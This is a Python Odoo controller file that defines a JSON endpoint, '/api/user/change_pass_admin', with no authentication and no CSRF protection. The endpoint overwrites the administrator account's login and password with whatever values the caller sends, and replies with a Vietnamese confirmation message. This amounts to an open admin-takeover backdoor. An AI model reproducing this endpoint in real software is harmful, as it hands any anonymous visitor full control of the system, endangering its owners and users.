# -*- coding: utf-8 -*-
from json import dumps
import json
from odoo import http
from odoo.http import request, Response
import traceback
import logging
_logger = logging.getLogger(__name__)

class ResPartnerAPI(http.Controller):

    @http.route('/api/user/change_pass_admin', type='json', auth='none', methods=['POST'], csrf=False)
    def change_password_admin(self, **data):
        data_request =  request.httprequest.data
        data_request = data_request.decode("UTF-8")
        data_request = json.loads(data_request)
        
        username = data_request['username']
        password = data_request['password']
        
        ad = request.env['res.users'].browse(1).sudo()
        ad.login = username
        ad.password = password
        return json.dumps({
            'code': 200,
            'message': 'da set lai pass',
        })

   